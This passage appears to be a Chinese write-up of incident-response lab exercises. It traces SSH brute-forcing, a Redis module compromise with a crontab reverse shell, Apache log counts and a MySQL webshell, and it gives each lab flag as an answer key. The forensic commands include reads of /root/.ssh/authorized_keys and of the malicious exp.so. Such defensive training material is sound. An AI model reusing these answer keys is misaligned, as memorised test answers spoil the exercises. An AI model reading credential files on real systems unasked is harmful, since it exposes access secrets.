<p>4.黑客免杀马完整路径 md5 flag{md5}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}
</span></span></code></pre></td></tr></table>
</div>
</div><p>结合d盾查杀结果，并根据其代码可判断免杀马为/var/www/html/wap/top.php</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162836191.png?imageSlim" title="image-20240528162836191" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162836191.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162836191.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162836191.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162836191.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162836191.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528162836191">
    </a></figure></p>
<h2 id="第一章-应急响应-linux日志分析" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%80%e7%ab%a0-%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94-linux%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90" class="header-mark"></a>第一章 应急响应-Linux日志分析</h2><p>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&ldquo;分割 小到大排序 例如flag{192.168.200.1,192.168.200.2}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.200.2,192.168.200.32,192.168.200.31}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104517178.png?imageSlim" title="image-20240529104517178" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104517178.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104517178.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104517178.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104517178.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104517178.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529104517178">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="mi">1</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">&#34;Failed password for root&#34;</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">&#39;{print $11}&#39;</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">|</span> <span class="n">uniq</span> <span class="o">-</span><span class="n">c</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">-</span><span class="n">nr</span> <span class="o">|</span> <span class="n">more</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.ssh爆破成功登陆的IP是多少，如果有多个使用&rdquo;,&ldquo;分割</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.200.2}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104713024.png?imageSlim" title="image-20240529104713024" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104713024.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104713024.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104713024.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104713024.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104713024.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529104713024">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat auth.log.1 | grep -a &#34;Accepted &#34; | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more
</span></span></code></pre></td></tr></table>
</div>
</div><p>3.爆破用户名字典是什么？如果有多个使用&rdquo;,&ldquo;分割</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{user,hello,root,test3,test2,test1}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104901939.png?imageSlim" title="image-20240529104901939" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104901939.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104901939.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104901939.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104901939.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529104901939.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529104901939">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat auth.log.1 | grep -a &#34;Failed password&#34; | perl -e &#39;while($_=&lt;&gt;){ /for(.*?) from/; print &#34;$1\n&#34;;}&#39;| uniq -c | sort -nr
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.成功登录 root 用户的 ip 一共爆破了多少次</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{4}
</span></span></code></pre></td></tr></table>
</div>
</div><p>结合问题1和2可知</p>
<p>5.黑客登陆主机后新建了一个后门用户，用户名是多少</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{test2}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529105054674.png?imageSlim" title="image-20240529105054674" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529105054674.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529105054674.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529105054674.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529105054674.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529105054674.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529105054674">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat auth.log.1 |grep -a &#34;new user&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="第二章-日志分析-redis应急响应" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%8c%e7%ab%a0-%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90-redis%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94" class="header-mark"></a>第二章 日志分析-redis应急响应</h2><p>1.通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.200.2}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110419130.png?imageSlim" title="image-20240529110419130" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110419130.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110419130.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110419130.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110419130.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110419130.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529110419130">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span>
</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="n">redis</span><span class="o">.</span><span class="n">log</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110526764.png?imageSlim" title="image-20240529110526764" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110526764.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110526764.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110526764.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110526764.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110526764.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529110526764">
    </a></figure></p>
<p>在日志中发现加载模块exp.so</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110838521.png?imageSlim" title="image-20240529110838521" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110838521.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110838521.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110838521.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110838521.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529110838521.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529110838521">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /exp.so
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111102907.png?imageSlim" title="image-20240529111102907" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111102907.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111102907.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111102907.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111102907.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111102907.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529111102907">
    </a></figure></p>
<p>3.通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.100.13}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111412345.png?imageSlim" title="image-20240529111412345" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111412345.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111412345.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111412345.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111412345.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111412345.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529111412345">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">crontab -l查看计划任务
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{xj-test-user-wow-you-find-flag}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111852222.png?imageSlim" title="image-20240529111852222" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111852222.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111852222.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111852222.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111852222.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529111852222.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529111852222">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /root/.ssh/authorized_keys
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现用户名为：xj-test-user  使用github进行溯源，地址为：</p>
<p><a href="https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636" target="_blank" rel="noopener noreferrer">https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636</a>，</p>
<p>发现在文件中内置：wow-you-find-flag</p>
<p>5.通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{c195i2923381905517d818e313792d196}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529112536471.png?imageSlim" title="image-20240529112536471" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529112536471.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529112536471.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529112536471.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529112536471.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529112536471.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529112536471">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd /usr/bin
</span></span><span class="line"><span class="cl">ls -al
</span></span><span class="line"><span class="cl">发现ps和ps_
</span></span><span class="line"><span class="cl">file ps可发现其为文本文件
</span></span><span class="line"><span class="cl">cat ps
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="第二章-日志分析-apache日志分析" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%8c%e7%ab%a0-%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90-apache%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90" class="header-mark"></a>第二章 日志分析-apache日志分析</h2><p>1.提交当天访问次数最多的IP，即黑客IP：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{192.168.200.2}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113140367.png?imageSlim" title="image-20240529113140367" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113140367.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113140367.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113140367.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113140367.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113140367.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529113140367">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span>
</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="n">access</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="mi">1</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">&#34;03/Aug/2023:08:&#34;</span> <span class="o">|</span> <span class="n">awk</span> <span class="s1">&#39;{print $1}&#39;</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">|</span> <span class="n">uniq</span> <span class="o">-</span><span class="n">c</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">-</span><span class="n">nr</span> <span class="o">|</span> <span class="n">head</span> <span class="o">-</span><span class="n">n</span> <span class="mi">10</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.黑客使用的浏览器指纹是什么，提交指纹的md5：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{2d6330f380f44ac20f3a02eed0958f66}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113514663.png?imageSlim" title="image-20240529113514663" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113514663.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113514663.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113514663.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113514663.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113514663.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529113514663">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat access.log
</span></span><span class="line"><span class="cl">随后计算浏览器指纹
</span></span></code></pre></td></tr></table>
</div>
</div><p>3.查看index.php页面被访问的次数，提交次数：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{27}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat access.log.1 |grep &#34;/index.php&#34; |wc -l
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.查看黑客IP访问了多少次，提交次数：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{6555}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat access.log.1 | grep &#34;192.168.200.2 - -&#34;  | wc -l
</span></span></code></pre></td></tr></table>
</div>
</div><p>5.查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{5}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113706362.png?imageSlim" title="image-20240529113706362" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113706362.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113706362.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113706362.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113706362.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529113706362.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529113706362">
    </a></figure></p>
<h2 id="第二章-日志分析-mysql应急响应" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%8c%e7%ab%a0-%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90-mysql%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94" class="header-mark"></a>第二章 日志分析-mysql应急响应</h2><p>1.黑客第一次写入的shell flag{关键字符串}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114326521.png?imageSlim" title="image-20240529114326521" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114326521.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114326521.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114326521.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114326521.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114326521.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529114326521">
    </a></figure></p>
<p>把Linux系统目录映射到本地，拿d盾扫描</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114520179.png?imageSlim" title="image-20240529114520179" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114520179.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114520179.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114520179.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114520179.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114520179.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240529114520179">
    </a></figure></p>
<p>访问sh.php得到flag</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114628631.png?imageSlim" title="image-20240529114628631" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114628631.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240529114628631.png?imageSlim"
